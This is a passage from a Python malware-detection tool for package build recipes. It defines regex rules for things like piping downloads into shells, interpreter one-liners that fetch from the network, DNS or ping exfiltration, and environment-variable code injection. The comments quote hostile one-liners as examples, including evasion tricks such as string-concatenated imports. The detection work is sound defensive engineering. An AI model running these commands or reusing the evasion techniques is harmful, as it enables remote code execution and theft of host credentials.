    will not do is examine *arguments*: `make "$pkgdir"` names a literal
    command, and treating its arguments as command words would fire on most
    of the corpus.

    A variable the tokenizer reduced to a literal is dropped: `$DKMS add`
    where the recipe assigned `DKMS=dkms` is a spelling choice, not an
    evasion.
    """
    for part in _split_commands(body):
        # `(( ... ))` and `[[ ... ]]` evaluate an expression; nothing in them
        # is a command name, and reading one as such fired on
        # `(( $(vercmp ...) >= 0 ))`.
        if _EVALUATION_RE.match(part.lstrip()):
            continue
        seen_wrapper = False
        wrapper = ""
        for token in part.split():
            if token.startswith("(("):
                # `if (( $(vercmp $2 x) >= 0 ))` - arithmetic. The check at
                # the top of the loop catches it when the part *begins*
                # there; after a wrapper it does not, and the `$(` inside
                # read as a command name.
                break
            word = token.lstrip("({")
            if not word:
                continue
            if _ASSIGNMENT_RE.match(word):
                if _opens_a_value(word):
                    break
                continue
            if _REDIRECT_RE.match(word) or _NUMERIC_RE.match(word):
                continue
            if word.startswith("-"):
                # A flag before any command means this line continues a
                # previous one - `sed \` then `  -i "${dir}/x"` - so it has
                # no command position at all. Inside a wrapper's arguments
                # it is just a flag, and the scan goes on.
                if not seen_wrapper:
                    break
                # ...unless the flag turns the wrapper into a *lookup*.
                # `command -v "$cmd"` asks where `$cmd` is, and runs
                # nothing; reading its argument as a command name fired on
                # the ordinary dependency-check idiom.
                if wrapper == "command" and word in ("-v", "-V"):
                    break
                if wrapper == "type" and word in ("-p", "-P", "-a"):
                    break
                continue
            if word.strip("\"'") in _WRAPPERS:
                seen_wrapper = True
                wrapper = word.strip("\"'")
                continue
            bare = _PLAIN_VAR_RE.match(word)
            if bare and bare.group(1) in resolvable:
                break
            yield word
            break


#: A plain scalar variable used as a command: `$DKMS`, `${MAKE}`.  An array
#: subscript or a nameref is deliberately not this shape.
_PLAIN_VAR_RE = re.compile(r"^[\"\']?\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?$")

#: `DKMS=$(which dkms)` then `$DKMS add ...`: a PATH lookup names its
#: executable *literally* inside the substitution, so the command is not
#: hidden from anything - it is spelled out one line up, and every payload
#: rule reads that line. The tokenizer cannot fold it, so the name stayed
#: unresolvable and X002 fired CRITICAL on it; it was the whole of the rule's
#: remaining benign-corpus rate outside `eval`.
#:
#: Narrow on purpose. It exempts the discovery idiom, not assignment in
#: general: `CMD=$(printf '\x63\x75\x72\x6c')` assembles a name that appears
#: nowhere, and stays an evasion.
_PATH_LOOKUP_ASSIGN_RE = re.compile(
    r"^\s*([A-Za-z_][A-Za-z0-9_]*)=[\"']?\$\(\s*"
    r"(?:which|type\s+-p|command\s+-v)\s+[A-Za-z0-9_.+-]+\s*\)",
)


def _path_lookup_names(lines: list[str]) -> set[str]:
    """Variables assigned the result of a PATH lookup."""
    names = set()
    for line in lines:
        match = _PATH_LOOKUP_ASSIGN_RE.match(line)
        if match:
            names.add(match.group(1))
    return names


#: `depends=(`, `source+=(`, `_arr[0]=(` - an assignment opening an array
#: literal.  A bare `(` is a subshell, whose contents *are* commands, so the
#: two are told apart by what precedes the paren rather than by the paren.
_ARRAY_ASSIGN_OPEN_RE = re.compile(
    r"^\s*[A-Za-z_][A-Za-z0-9_]*(?:\[[^\]]{0,40}\])?\+?=\s*\("
)


def _quote_open_at_end(text: str, quote: str | None) -> str | None:
    """The quote character still open when *text* ends, or None.

    Carried across lines, because a quoted string is allowed to span them::

        eval "package_$i()
          $(declare -f _package_x11 | tail +2)"

    The second line is the middle of a string. Read on its own it starts
    with `$(`, which is a command substitution in first position - and
    that is exactly what a rule looking for an assembled command name is
    hunting for. The difference is that this one is inside quotes somebody
    else opened.
    """
    index = 0
    while index < len(text):
        ch = text[index]
        if quote == "'":
            if ch == "'":
                quote = None
        elif quote == '"':
            if ch == "\\":
                index += 1
            elif ch == '"':
                quote = None
        elif ch == "\\":
            index += 1
        elif ch in "'\"":
            quote = ch
        index += 1
    return quote


def _unquoted_paren_delta(text: str) -> int:
    """``(`` minus ``)`` outside quotes, so a paren in a string does not count.

    ``sed 's/(/x/'`` inside an array would otherwise leave the depth
    counter raised for the rest of the file.
    """
    depth = 0
    quote = None
    for ch in text:
        if quote:
            if ch == quote:
                quote = None
        elif ch in "'\"":
            quote = ch
        elif ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
    return depth


def _continuation_lines(raw_lines: list[str], joined_count: int) -> set[int]:
    """Joined-line indices whose command position belongs to an earlier line.

    ``join_line_continuations`` rejoins a backslash-continued command, but
    only across lines carrying the *same* diff marker. Editing the tail of
    one separates the halves with the removed version::

         httpdirfs "${_opts[@]}" \\
           --dl-seg-size 1 --single-file-mode \\
        -   "${_iso_url}" "${_http_mount}" > /dev/null
        +   "${_iso_url}" "${_http_mount}"

    The head is context and the tail is an addition, so the join never
    happens: the ``+`` line arrives alone and its first word - an argument
    to a command two lines up - reads as a command name. Every remaining
    benign-corpus hit on X002 was this shape.

    Removed lines are skipped when deciding what precedes a line, which is
    what reconnects the two halves. This is the same reasoning as the
    leading-flag rule in :func:`_command_words`: a line that continues
    another has no command position at all, so there is nothing on it for
    X002 to read. And it is not a way through: the continued command is the
    one on the head line, so a payload on the tail is an *argument* to it,
    which this rule has never claimed.

    Measured on the raw lines, because the joiner strips the backslash the
    measurement depends on, then mapped onto joined positions through
    ``_joined_indexed`` - the same pairing the rule path uses.
    """
    from ..tokenizer import _joined_indexed

    carried_raw: set[int] = set()
    pending = False
    array_depth = 0
    test_depth = 0
    quote: str | None = None
    for index, line in enumerate(raw_lines):
        if line.startswith("-"):
            # Including `---`: a file header is not part of any command.
            continue
        raw_body = line[1:] if line[:1] in "+ " else line
        # A `#` inside an open string is not a comment.
        body = raw_body if quote else _strip_comment(raw_body)
        if pending or array_depth > 0 or test_depth > 0 or quote:
            carried_raw.add(index)
        # `if ! [[` on one line and the condition on the next: the
        # condition is not a command, and read alone its first word is
        # whatever the test compares.
        test_depth = max(0, test_depth + body.count("[[") - body.count("]]"))
        quote = _quote_open_at_end(body, quote)
        # An array literal spanning lines: `depends=(` then a line per
        # entry. Those entries are data, and one of them - `"${_depends[@]}"`
        # in a split package - read as a command word the moment split
        # packages came into scope. The opening line is an assignment and
        # is skipped anyway; what needed tracking is everything up to the
        # closing paren.
        if array_depth > 0 or _ARRAY_ASSIGN_OPEN_RE.match(body):
            array_depth = max(0, array_depth + _unquoted_paren_delta(body))
        stripped = body.rstrip()
        # A trailing backslash continues the line, unless it is itself
        # escaped (`printf 'x\\\\'`).
        pending = stripped.endswith("\\") and not stripped.endswith("\\\\")

    if not carried_raw:
        return set()
    pairs = _joined_indexed(raw_lines)
    if len(pairs) != joined_count:
        # The two joiners are documented to agree; if they ever do not,
        # drop the refinement rather than silence a line at the wrong index.
        return set()
    return {j for j, (raw_index, _text) in enumerate(pairs) if raw_index in carried_raw}


# ---------------------------------------------------------------------------
# X009: a fetch reaches an executor through a client nobody catalogued.
# ---------------------------------------------------------------------------
#
# R001 and R002 are the pipe-to-shell rules, and they name two programs.
# Every other way of getting bytes off a network and into a shell -
# `lftp -c "cat URL" | bash`, `nc host 80 | bash`, `scp host:/x -  | bash`,
# `openssl s_client -connect h:443 | bash`, `dig +short TXT d | sh`,
# `aria2c -o - URL | bash` - produced nothing at all.  Two of those score
# *zero with no coverage gap*, which is the worst output the tool has: a
# silent clean verdict on a working remote-code-execution.
#
# The rule deliberately excludes curl and wget.  R001/R002 already claim
# those, and one operation scored twice is its own kind of wrong.
X009_RE = re.compile(
    r"\b(?:" + _OTHER_FETCH_CLIENT + r")\b[^\n|;&]*+"
    r"(?<!\\)\|\s*(?:" + _SHELL + r")",
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# X010: an interpreter one-liner that reaches the network.
# ---------------------------------------------------------------------------
#
# `php -r 'system(file_get_contents(URL));'` and
# `python3 -c '...urlopen(os.environ["U"]).read()'` need no shell client at
# all, so H016's inventory never sees them and R044 wants a flag spelling
# they need not use.  The signal is a URL, or a fetch call, inside a script
# the recipe passes on the command line.
X010_RE = re.compile(
    r"\b(?:python[23]?|perl|ruby|node|php|lua)\s+(?:-\S++\s++)*?-[ceEr]\b"
    r"[^\n]{0,400}?"
    r"(?:https?://"
    r"|urlopen|urlretrieve|urllib|requests\.(?:get|post)|httpx"
    r"|file_get_contents|fsockopen|curl_exec"
    r"|Net::HTTP|LWP|getstore|open-uri|URI\.(?:open|parse)"
    r"|https?\.get|fetch\s*\(|socket\.(?:create_)?connect)",
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# X018: an interpreter one-liner that assembles the name it calls.
# ---------------------------------------------------------------------------
#
# X010 and R044 look for a module or function *name* inside a `-c` script:
# `urlopen`, `file_get_contents`, `LWP`. Every one of those lists is a
# keyword list, and a keyword list in a language with string concatenation
# is a suggestion:
#
#   python3 -c 'import importlib; importlib.import_module("url"+"lib.request")'
#   node -e 'require("child_"+"process").execSync(cmd)'
#   python3 -c 'getattr(__import__("os"), "sys"+"tem")(cmd)'
#
# One `+` defeated all three rules at once. So this rule does not look for
# a name - it looks for the *assembly*: a dynamic-import or attribute-lookup
# primitive, or a string concatenation, inside a command-line script. A
# recipe that needs a module imports it by name on the first line; building
# the name at runtime inside a `-c` argument is not a style, it is the
# technique the keyword lists exist to catch.
X018_RE = re.compile(
    r"\b(?:python[23]?|perl|ruby|node|deno|bun|php|lua)\s+(?:-\S++\s++)*?-[ceEr]\b"
    r"[^\n]{0,400}?(?:"
    # Reflection: the name is a value, not a token.
    r"__import__\s*\(|importlib\.import_module|getattr\s*\(|__dict__\s*\["
    r"|Object\[|eval\s*\(|exec\s*\(|Function\s*\(|instance_eval"
    r"|const_get|send\s*\(:|call_user_func|\$\$\w+"
    # Or the name is glued together from pieces no list can hold.
    r"|[\"'][A-Za-z_][\w.]*[\"']\s*\+\s*[\"'][\w.]*[\"']"
    r"|[\"'][\w.]*[\"']\s*\.\s*[\"'][\w.]*[\"']"
    # Or the one-liner simply hands a build-tree path to the language's
    # own exec primitive: `ruby -e 'exec "bash", "$srcdir/x.sh"'`. No name
    # is assembled and no module is imported, so neither the reflection
    # arms above nor X010's network list has anything to match.
    # Ruby writes `exec "bash", "x"` with no parentheses at all, so the
    # call is recognised by the name followed by *either* a paren or
    # whitespace.
    r"|(?:exec|system|spawn|popen|execv?p?e?|posix_spawn|Process\.\w+"
    r"|subprocess\.\w+|os\.exec\w*|open[23]|IPC::Open[23])\s*[\s(][^\n]{0,120}?"
    r"\$\{?(?:srcdir|startdir|PWD|BUILDDIR)\}?/"
    r")",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# X019: host material leaves the machine, or is baked into the package.
# ---------------------------------------------------------------------------
#
# Two shapes of the same act, neither of which looks like a fetch.
#
# The first sends: a DNS query whose *name* is computed
# (`dig +short "$(hostname).e.example"`), or an ICMP packet whose payload is
# a hex dump (`ping -c1 -p "$(od -An -tx1 /etc/hostname | tr -d ' ')"`).
# Both are ordinary diagnostic tools carrying data out in a field nobody
# reads as a channel, and H071's list is tor and dns-tunnel binaries.
#
# The second does not send at all: it writes host material into `$pkgdir`,
# and the exfiltration happens later, when the package is published. `env`,
# `/etc/machine-id`, `~/.ssh`, `/etc/hostname` and the shell history are
# the recipe's view of the machine that built it, and none of them belong
# in a package. `install -D /etc/machine-id` trips R058; `cat` reading the
# same file into the same place was silent.
X019_RE = re.compile(
    # A query name or ICMP payload the recipe computes.
    # Command position, not anywhere: `host` is also an English word, and
    # `echo "Host: $(uname -rn)"` is a build script printing a banner.
    r"(?:\A\s*|[;&|(]\s*|&&\s*)(?:dig|drill|kdig|host|nslookup)\s"
    r"[^\n;&|]*\$[({]"
    r"|(?:\A\s*|[;&|(]\s*|&&\s*)ping6?\s[^\n;&|]*\s-p\s*[\"']?\$[({]"
    # Host material written into the package.
    r"|(?:\A\s*|[;&|(]\s*|&&\s*)(?:env|printenv|set|hostname|id|uname)\b"
    r"[^\n;&|]*>\s*[\"']?[^\"'\s;&|]*\$\{?pkgdir\}?"
    r"|(?:/etc/(?:machine-id|hostname|shadow|hosts)"
    r"|\$\{?HOME\}?/\.(?:ssh|aws|gnupg|docker|netrc)"
    r"|~/\.(?:ssh|aws|gnupg|docker|netrc)"
    r"|\.(?:bash_history|zsh_history))"
    r"[^\n;&|]*>\s*[\"']?[^\"'\s;&|]*\$\{?pkgdir\}?",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# X011: a package manager resolves and runs third-party code at build time.
# ---------------------------------------------------------------------------
#
# `pip install git+https://...`, `npm install <url>`, `cargo install --git`,
# `gem install`, `go install m@latest` each fetch code and then execute it -
# setup.py and PEP 517 hooks, npm lifecycle scripts, build.rs, extconf, a
# module build.  None of it is in the recipe, none of it is checksummed by
# it, and every one of these scored zero.  H035 covers the same verbs but is
# scoped to install hooks by design, so a build-time install fell between.
#
# The coverage gap `unpinned_build_deps` already reports the *unpinned*
# subset as a gap; this is the finding, because "the build runs code from a
# registry" is evidence about the recipe, not merely a limit on the reader.
#: Spellings that answer the rule's own question with "no".
#:
#: Both benign-corpus hits carried their disqualifier on the same line, and
#: they are the two that matter: `npm install --ignore-scripts` explicitly
#: turns off the lifecycle hooks that make an install dangerous, and
#: `pip install --no-deps .` installs the wheel this recipe just built rather
#: than resolving anything from a registry.  Firing on either would be
#: reporting the *careful* spelling.
X011_STANDDOWN_RE = re.compile(
    r"--ignore-scripts|--no-index|--offline|--no-deps"
    r"|--frozen-lockfile\b[^\n]*--offline"
    # A local *target*: the current directory or a path in the build tree.
    # `--prefix "$srcdir"` is a destination, not a target, and matching any
    # occurrence of `$srcdir` stood the rule down on
    # `npm install evilpkg --prefix "$srcdir"` - a registry fetch with a
    # local install prefix, which is the opposite of what the flag means.
    r"|\s\.(?:\s|$)|\s\./"
    r"|(?<!prefix=)(?<!prefix\s)(?<!prefix=\")(?<!root=)\s\$\{?(?:srcdir|startdir)\}?/"
    # A *local* artifact only, and the whole argument must be local: anchored
    # to a whitespace-preceded token so the match cannot start part-way
    # through `https://e/x.tgz`, which is a remote target that happens to
    # end in an archive suffix.  Standing down on that would be reading the
    # extension instead of the address.
    r"|(?<=\s)(?!\S*://)[\w.-]+(?:/[\w.-]+)*\.(?:whl|tgz|gem|crate)\b",
    re.IGNORECASE,
)

#: The distribution's own package tools, for which no local-path
#: stand-down applies.
_DISTRO_INSTALL_RE = re.compile(
    r"\b(?:pacman\s+-|makepkg\s+(?:-\S*i|--install)"
    r"|(?:apt-get|apt|dnf|yum|zypper|apk|emerge)\s+(?:install|add))",
    re.IGNORECASE,
)

X011_RE = re.compile(
    r"(?:\A\s*|[;&|(]\s*|&&\s*|\|\|\s*)"
    r"(?:" + _EXEC_WRAPPER + r")?"
    # `python3 -m pip install` and `node --require ... npm` reach the same
    # manager through the interpreter that ships it.
    r"(?:(?:python[23]?|py|node|ruby|perl)\s+-\S+\s+)?"
    r"(?:" + _PACKAGE_MANAGER_INSTALL + r")\b",
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# X012: the build's toolchain is replaced with something from the source tree.
# ---------------------------------------------------------------------------
#
# `export CC="$srcdir/mcc"` and `export PATH="$srcdir/bin:$PATH"` do not
# fetch and do not execute anything the reader can see.  What they do is
# decide which binary the *next* line runs, and the next line is `make`.
# H025 reports LD_PRELOAD and LD_LIBRARY_PATH as a generic environment HIGH,
# but nothing connected the override to the build step it redirects, and
# `CC`/`CXX`/`PATH` were not covered at all.
X012_RE = re.compile(
    r"\b(?:export\s+)?"
    r"(?P<var>CC|CXX|LD|AR|RANLIB|NM|OBJCOPY|STRIP|CPP|HOSTCC"
    r"|PATH|LD_PRELOAD|LD_LIBRARY_PATH|LD_AUDIT|PERL5LIB|PYTHONPATH"
    r"|NODE_OPTIONS|RUSTC_WRAPPER|MAKEFLAGS|CARGO)\s*=\s*"
    r"[\"']?[^\n\"']*?"
    # `PATH="$srcdir:$PATH"` prepends the build directory itself, with no
    # path component after it, and requiring a `/` meant the plainest
    # spelling of the plainest case matched nothing.
    r"\$\{?(?:srcdir|startdir|pkgdir)\}?(?:[/:\"']|\s|$)",
    re.IGNORECASE,
)

#: What X012 redirects: a compile or configure step later in the same body.
X012_CONSUMER_RE = re.compile(
    r"(?:\A\s*|[;&|(]\s*|&&\s*)(?:" + _EXEC_WRAPPER + r")?"
    r"(?:g?make|cmake|ninja|meson|configure|\./configure|autoreconf|gcc|g\+\+"
    r"|clang|cargo|go|rustc|python[23]?\s+setup\.py|scons|waf|bazel)\b",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# X013: the recipe changes where a fetch goes, or what it trusts.
# ---------------------------------------------------------------------------
#
# A URL in `source=()` says where the bytes come from, and a reader checks
# the host.  These override that answer after the fact: a proxy re-points
# every fetch, `--resolve`/`--connect-to` remap one host to another address,
# `--doh-url` moves name resolution to a server the recipe chooses, and
# `--cacert`/`SSL_CERT_FILE`/`CURL_CA_BUNDLE` replace the trust root so a
# substituted host verifies cleanly.  The URL a reviewer reads is then not
# the machine the build talks to, which is the same deception X006 claims
# about the URL itself.
#
# R057 already owns `-k`/`--insecure` - turning verification *off* - and
# this is the other half: keeping verification on and owning what it checks
# against.  The proxy exports rang H003 LOW and the rest were silent.
#: The verification pattern this rule must not report.
#:
#: `gpg --homedir="$_gnupghome" --import "$srcdir/maintainer.gpg"` is how a
#: package that checks upstream signatures is *supposed* to look: the key
#: arrives through `source=()`, so makepkg checksums it and the diff shows
#: any change to it, and `--homedir` scopes the import to a throwaway
#: keyring rather than the user's.  A key from `$srcdir` is covered by the
#: source-verification chain; one fetched at build time is not, and H016 and
#: H082 claim that fetch on its own line.
#:
#: `--recv-keys` is deliberately absent from this stand-down: it pulls a key
#: from a keyserver the recipe names, which is the network fetch the source
#: array would otherwise have to declare.
X013_STANDDOWN_RE = re.compile(
    r"(?:gpg2?|pacman-key)\b(?![^\n;&|]*--recv-keys)"
    r"[^\n;&|]*\$\{?srcdir\}?/",
    re.IGNORECASE,
)

X013_RE = re.compile(
    r"--(?:proxy|preproxy|socks[45]a?|proxy1\.0|noproxy|doh-url"
    r"|resolve|connect-to|cacert|capath|proxy-cacert|proxy-insecure"
    r"|pinnedpubkey)\b"
    r"|\b(?:export\s+)?(?:HTTPS?_PROXY|https?_proxy|ALL_PROXY|all_proxy"
    r"|NO_PROXY|no_proxy|SSL_CERT_FILE|SSL_CERT_DIR|CURL_CA_BUNDLE"
    r"|GIT_SSL_CAINFO|GIT_SSL_NO_VERIFY|REQUESTS_CA_BUNDLE|NODE_EXTRA_CA_CERTS"
    r"|PIP_INDEX_URL|PIP_EXTRA_INDEX_URL|npm_config_registry)\s*=" 
    r"|\bgit\b[^\n;&|]*?-c\s+(?:http|https)\.(?:proxy|sslCAInfo|sslVerify)"
    r"|\bnpm\s+config\s+set\s+(?:registry|cafile|strict-ssl)"
    # A keyring is a trust root too.  `gpg --import k.asc` on a key this
    # recipe fetched, or `--recv-keys` from a keyserver it names, makes
    # every later signature check pass against the attacker's key - the
    # same substitution as replacing a CA bundle, with verification left
    # switched on so it reads as diligence.  `--verify` is untouched: that
    # is the check, not the trust.
    r"|\bgpg2?\b[^\n;&|]*?--(?:import\b|recv-keys|keyserver|import-ownertrust)"
    r"|\bpacman-key\b[^\n;&|]*?--(?:add|recv-keys|lsign-key|populate)"
    r"|\bapt-key\s+add|\brpm\s+--import"
    r"|\bpip\s+config\s+set\b[^\n;&|]*?index-url",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# X014: an environment variable whose value is code the shell will run.
# ---------------------------------------------------------------------------
#
# X012 covers a toolchain *path* redirected into the source tree - which
# binary the next compile step invokes.  This is the other half: variables
# whose value is not a path the build chooses to use, but a script the shell
# runs on its own initiative.
#
# `BASH_ENV` and `ENV` are sourced by every non-interactive shell bash or sh
# starts, so setting one makes every later `bash -c`, every sub-make recipe
# line and every helper script run the named file first.  `PROMPT_COMMAND`
# and `PS0`/`PS1` are evaluated as commands.  `SHELLOPTS` and `BASHOPTS` are
# read-only in an interactive shell but honoured from the environment at
# startup.  `BASH_FUNC_x%%` smuggles an entire function definition through
# the environment - the Shellshock carrier - and `GIT_SSH_COMMAND`,
# `GIT_EXTERNAL_DIFF` and `LESSOPEN` are run by the tools that read them.
#
# Assigning any of these is not "configuration a rule might disagree with";
# the assignment *is* the execution, and none of them appears in the benign
# corpus.
X014_RE = re.compile(
    r"\b(?:export\s+|declare\s+-x\s+)?"
    r"(?P<var>BASH_ENV|ENV|PROMPT_COMMAND|PS0|PS4"
    r"|SHELLOPTS|BASHOPTS|BASH_FUNC_\w+%%"
    r"|GIT_SSH_COMMAND|GIT_EXTERNAL_DIFF|GIT_PAGER|GIT_EDITOR"
    r"|LESSOPEN|LESSCLOSE|PAGER|EDITOR|VISUAL"
    r"|LD_AUDIT|GCONV_PATH|LOCPATH|HOSTALIASES"
    # The per-interpreter equivalents of BASH_ENV: each names code the
    # interpreter runs before the program it was asked to run.
    #
    # `PERL5LIB` and `PYTHONPATH` are deliberately absent. They name a
    # place to *look for* modules, not code to run, and `perl-*` and
    # `python-*` recipes set them as a matter of course - five benign
    # packages fired the moment they were included. X012 already claims
    # them, and claims the thing that actually matters about them: a
    # library path pointed into the source tree.
    r"|RUBYOPT|PERL5OPT|PYTHONSTARTUP|NODE_REPL_EXTERNAL_MODULE"
    r"|LUA_INIT|R_PROFILE_USER|JAVA_TOOL_OPTIONS|_JAVA_OPTIONS)"
    r"\s*=\s*(?![\s;]*$)"
    # A command-line hook flag carries code the same way an environment
    # variable does: `restic --option pre-exec=...`, `borg --pre-hook ...`,
    # `rsync -e "ssh -o ProxyCommand=..."`, `--exec`, `--on-failure`.  The
    # tool runs the value; the recipe only names it.
    r"|--(?:pre|post)-?(?:exec|hook|command|script|backup|run)\b"
    r"|\b(?:pre|post)-(?:exec|hook|command|script)\s*="
    r"|\bProxyCommand\s*=|\bLocalCommand\s*=|\bPermitLocalCommand\b"
    # git's own documented exec-bearing configuration keys. A bounded
    # list, because git publishes it: each of these names a program git
    # runs, and `git -c key=cmd <verb>` or `git config key cmd` sets one
    # without any of it looking like a command.
    r"|\bcore\.(?:fsmonitor|pager|editor|sshCommand|hooksPath|askPass)\b"
    r"|\bdiff\.(?:external|[\w-]+\.(?:command|textconv))\b"
    # `submodule.<n>.update` takes `checkout|rebase|merge|none|!command`
    # and a git alias is a git subcommand unless it is prefixed with `!`.
    # Only the bang form runs a shell, and `git config
    # submodule.lib/googletest.update "none"` - disabling a submodule - is
    # ordinary enough to appear in the benign corpus twice.
    r"|\bsubmodule\.[^\s=]*\.update\b\s*[= ]\s*[\"']?!"
    r"|\balias\.[\w-]+\b\s*[= ]\s*[\"']?!"
    r"|\bfilter\.[\w-]+\.(?:clean|smudge|process)\b"
    r"|\bcredential\.(?:helper|[\w:/.]+\.helper)\b"
    r"|\buploadpack\.packObjectsHook\b|\bprotocol\.[\w-]+\.command\b"
    r"|\bsequence\.editor\b|\bgpg\.program\b"
    # `rsync -e`/`--rsh` names the transport program rsync executes.
    r"|\brsync\b[^\n;&|]*?\s--?(?:e|rsh)[=\s]"
    r"|--(?:exec|command|on-failure|on-success|filter|use-compress-program)"
    r"\s*[=\s]\s*[\"']?[^\s\"';]*/"
    # Flag-agnostic, and bounded on the *value* rather than the name.
    # `--reloadcmd`, `--callback`, `--ssh-keys`, `-c`: the list of flags
    # that carry a command is as open-ended as the list of daemons that
    # define them, and the audit's own answer was a 60-name catalogue. A
    # value that *begins with an executor and names a build directory* is
    # a command whatever flag holds it, and no package in the benign
    # corpus passes one.
    # The flag prefix is gone and the build path is asserted rather than
    # walked to. `--?[\w-]+[=\s]+` retried its character run at every
    # position and the lazy span behind it re-scanned from each - together
    # 1522 ms on a full-length line, which the safety audit refuses. A
    # quoted value that *starts* with an executor is rare enough to anchor
    # on, and the lookahead then runs once per such value.
    # A leading `|` keeps mutt's `push "|bash"` in scope: the value is a
    # pipeline the host runs, and the bar is part of it.
    r"|[\"']\|?\s*(?:(?:/(?:usr/)?bin/)?(?:ba|z|da|k|)sh"
    r"|python3?|perl|ruby|node|php|lua)\s"
    r"(?=[^\"'\n]{0,120}\$\{?(?:srcdir|startdir|PWD|BUILDDIR)\}?/)"
    # A flag whose value is a *script* in the build tree. `--callback
    # "$PWD/x.sh"` names something the tool will run; `--prefix
    # "$srcdir/out"` names a directory, which is why the extension is
    # required. `install -Dm755 "$srcdir/x.sh" "$pkgdir/..."` is packaging
    # and was every one of this arm's benign matches.
    # A quoted value that *is* a pipeline into a shell. A mutt macro
    # spelled `push "|bash"` hands the message to a shell, and there is no
    # build path anywhere in it - the payload is what the tool feeds in.
    # The quotes may be backslash-escaped, because the value is nested
    # inside another quoted argument: `mutt -e "push \"|bash\""`.
    r"|\\?[\"']\s*\|\s*(?:/(?:usr/)?bin/)?(?:ba|z|da|k|)sh\s*\\?[\"']"
    # The flag token is anchored so it cannot retry mid-word, and the value
    # is asserted rather than walked to. Written as a plain span the flag
    # run and the path run re-scanned each other: 1542 ms on a full-length
    # line, which the safety audit refuses.
    r"|(?<![\w-])-{1,2}[\w-]{1,24}"
    r"(?==?\s?[\"']?\$\{?(?:srcdir|startdir|PWD|BUILDDIR)\}?/"
    r"[\w./-]{0,80}\.(?:sh|bash|py|pl|rb|js|lua|php)(?![\w.]))",
    re.IGNORECASE,
)

#: Assignments that set one of those to a harmless constant.  `PAGER=cat`
#: and `EDITOR=true` are how a recipe stops a tool from opening a pager in a
#: build log, which is the opposite of running something.
X014_STANDDOWN_RE = re.compile(
    # `install`, `cp`, `mv` and `ln` name paths to copy; their arguments
    # are not exec slots. `rsync` is deliberately absent - its `-e` names
    # the transport program it runs.
    r"(?:\A\s*|[;&|(]\s*|&&\s*)(?:install|cp|mv|ln)\s"
    r"|=\s*[\"']?(?:cat|true|false|:|/bin/true|/usr/bin/true|less|more|vi|vim"
    r"|nano|/dev/null)[\"']?\s*(?:;|$)",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# X015: the recipe schedules something to run after the build.
# ---------------------------------------------------------------------------
#
# A package *declares* units and timers as files, which pacman installs and
# the administrator enables; R054 claims those, and the reader can see them.
# Running `crontab -`, `systemd-run`, `at` or `incrontab` during the build is
# a different act: it registers work on the machine doing the building, now,
# outside anything pacman records or can remove.
#
# The scheduled command is usually a path this recipe just wrote, so the
# whole chain reads as "fetch, write, arrange to run later" - and every arm
# of it scored at most H016's undeclared-fetch HIGH, because the run never
# happens on a line any execution rule reads.
#
# `systemctl enable` is deliberately absent: a package's `.install` scriptlet
# enabling its own unit is ordinary packaging, and R054 already reads the
# unit file itself.
X015_RE = re.compile(
    r"(?:\A\s*|[;&|(]\s*|&&\s*|\|\|\s*)"
    r"(?:" + _EXEC_WRAPPER + r")?"
    # `batch` takes its command on stdin and needs no argument at all, so
    # requiring one meant the plainest spelling matched nothing.
    r"(?:crontab\b|at\s+(?:-\S+\s+)*(?:now|\+|[0-9])|batch\b"
    r"|systemd-run\b|incrontab\b|entr\b|inotifywait\b|inotifywatch\b"
    r"|udevadm\s+control\b"
    # `enable --now` starts the unit; excluding `enable` outright let the
    # one spelling that both installs and runs it through.
    r"|systemctl\s+(?:--user\s+)?(?:start\b|enable\s+[^\n;&|]*--now\b))"
    r"|\bcrontab\s+-\b|\bcrontab\s+[^\n;&|]*\|"
    r"|(?<![\w-])RUN\+?=\s*[\"']",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# X016: a fetch piped into something this analyser cannot name.
# ---------------------------------------------------------------------------
#
# R001 claims `curl … | bash` by naming the executor, and every executor it
# does not name is a bypass: `deno`, `bun`, `pwsh`, `julia`, `Rscript`,
# `guile`, `zx`, `escript`, `mruby`, `fennel` all ran the fetched bytes for
# an undeclared-fetch HIGH and nothing more. Adding those words fixes those
# words; the attacker picks the next one.
#
# So the list is inverted. The set of interpreters is unbounded and chosen
# by the attacker, but the set of things a recipe legitimately pipes a
# download into is small and chosen by the ecosystem: an extractor, a
# checksum, a text filter, a viewer. Those are enumerated below, and
# anything else at the end of a fetch pipeline is claimed - not because the
# word is known to be an interpreter, but because it is *not known to be a
# consumer*, and an auditor reading the line cannot say the bytes are only
# being looked at.
#
# The rule stands down on the executors R001 already claims. Its whole
# subject is the sink R001 could not name, and reporting both would charge
# one pipeline twice.

#: Everything a recipe pipes a download into without running it: unpack it,
#: verify it, filter it, look at it, or write it down. Bounded by what the
#: ecosystem actually does, which is why this list can be complete in a way
#: the executor list cannot.
_DATA_CONSUMER = (
    r"(?:bsd)?tar|cpio|unzip|zcat|bzcat|xzcat|lzcat|zstdcat"
    r"|g?unzip|gzip|bunzip2|bzip2|unxz|xz|unzstd|zstd|unlz4|lz4|lzma|unlzma"
    r"|brotli|lrzip|uncompress"
    r"|grep|e?grep|f?grep|rg|ag|ack|sed|awk|gawk|mawk|nawk|cut|tr|sort|uniq"
    r"|head|tail|wc|jq|yq|xmllint|xmlstarlet|column|tac|rev|fold|paste|join"
    r"|comm|split|csplit|nl|expand|unexpand|fmt|pr|shuf|numfmt|strings|file"
    r"|iconv|dos2unix|unix2dos|recode"
    r"|tee|cat|dd|sponge|install|patch|git|diff|cmp|pv|less|more|bat"
    r"|(?:sha[0-9]+|md5|b2)sum|cksum|openssl|gpg[v2]?|minisign|signify"
    r"|base32|base64|basenc|xxd|od|hexdump"
    r"|ffmpeg|convert|magick|gm|inkscape|rsvg-convert|optipng|potrace"
    r"|desktop-file-validate|appstream-util|msgfmt|msgcat|gettext"
)

#: A sink is read as the first word after the last `|`, so wrappers that
#: take the real command as an argument have to be stepped over first.
_PIPE_WRAPPER_RE = re.compile(
    r"\A(?:(?:env|command|exec|sudo|doas|nice|ionice|stdbuf|timeout|nohup"
